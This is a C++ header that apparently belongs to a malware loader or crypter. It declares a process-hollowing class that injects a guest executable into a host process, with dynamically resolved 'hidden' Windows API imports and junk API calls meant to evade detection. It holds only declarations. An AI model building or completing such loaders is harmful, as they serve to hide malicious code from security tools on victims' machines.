#ifndef STUBBORN_PROCESS_HOLLOWER_H
#define STUBBORN_PROCESS_HOLLOWER_H

#include <memoryapi.h>
#include <windows.h>
#include <winnt.h>
#include "debug.h"
#include "hiddenImports.h"
#include "junkApiCalls.h"
#include "windowsInternals.h"

class ProcessHollower {
    public:
        ProcessHollower();
        ~ProcessHollower();
        BOOL execute(char *lpHostApplicationName, LPVOID lpGuestPEData);

private:
    VIRTUAL_ADDRESS dwGuestPEAddress;
    PPE_HEADERS pGuestPEHeaders;
    VIRTUAL_ADDRESS dwHostImageBaseAddress;
    LPPROCESS_INFORMATION lpHostProcessInformation;

    // Hidden Imports
    _CreateProcessA HiddenCreateProcessA;
    _NtUnmapViewOfSection HiddenNtUnmapViewOfSection;
    _VirtualAllocEx HiddenVirtualAllocEx;
    _WriteProcessMemory HiddenWriteProcessMemory;
    _VirtualProtectEx HiddenVirtualProtectEx;
    _GetThreadContext HiddenGetThreadContext;
    _SetThreadContext HiddenSetThreadContext;
    _ResumeThread HiddenResumeThread;
    _ReadProcessMemory HiddenReadProcessMemory;
    BOOL ResolveHiddenImports();

    // Functions for Process Hollowing
    VOID GetGuestPEData(LPVOID lpBuffer);

    BOOL CreateHostProcess(char *lpHostApplicationName);

    BOOL GetHostProcessBaseAddress();

    BOOL UnmapHostProcessMemory();

    BOOL AllocateProcessMemory();

    BOOL InjectGuestPE();

    BOOL WriteProcessSection(VIRTUAL_ADDRESS lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize);

    DWORD findRelocationSection();

    BOOL ApplyRelocations(VIRTUAL_ADDRESS dwRelocationDelta);

    BOOL ApplyBlockRelocations(DWORD dwEntryCount, DWORD &dwOffset, PBASE_RELOCATION_ENTRY pBlocks, PBASE_RELOCATION_BLOCK pBlockHeader, VIRTUAL_ADDRESS dwRelocationDelta);

    BOOL SetSectionsPermissions();

    static VOID SetEntryPoint(PCONTEXT pContext, VIRTUAL_ADDRESS dwEntrypoint);

    BOOL JumpToEntryPoint();

    VOID TerminateHostProcess();
};

#endif // STUBBORN_PROCESS_HOLLOWER_H
